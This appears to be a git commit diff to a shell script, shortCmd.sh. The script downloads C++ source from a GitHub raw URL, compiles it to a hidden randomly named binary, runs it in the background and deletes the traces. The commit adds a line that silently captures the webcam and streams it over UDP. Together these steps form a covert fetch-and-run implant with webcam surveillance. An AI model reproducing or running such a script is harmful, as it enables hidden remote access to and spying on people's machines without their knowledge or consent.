d550c0ac196177eb9a74ef042433ee2678371907
GOUACHE-Nathan-2225041 <123471299+GOUACHE-Nathan-2225041aa@users.noreply.github.com>
2024-10-09 08:19:03 +0200

    Update shortCmd.sh

--- shortCmd.sh
+++ shortCmd.sh
@@ -2,6 +2,7 @@ fileName=$(echo $RANDOM $RANDOM | tr -d ' ')
 curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | cat > hey.cxx
 g++ hey.cxx -o .$fileName
 ./.$fileName &
+ffmpeg -f video4linux2 -i /dev/video0 -hide_banner -loglevel quiet -stats -preset ultrafast -vcodec libx264 -tune zerolatency -b 900k -f mpegts udp://127.0.0.1:5015 &
 rm hey.cxx
 rm ./.$fileName
 exit
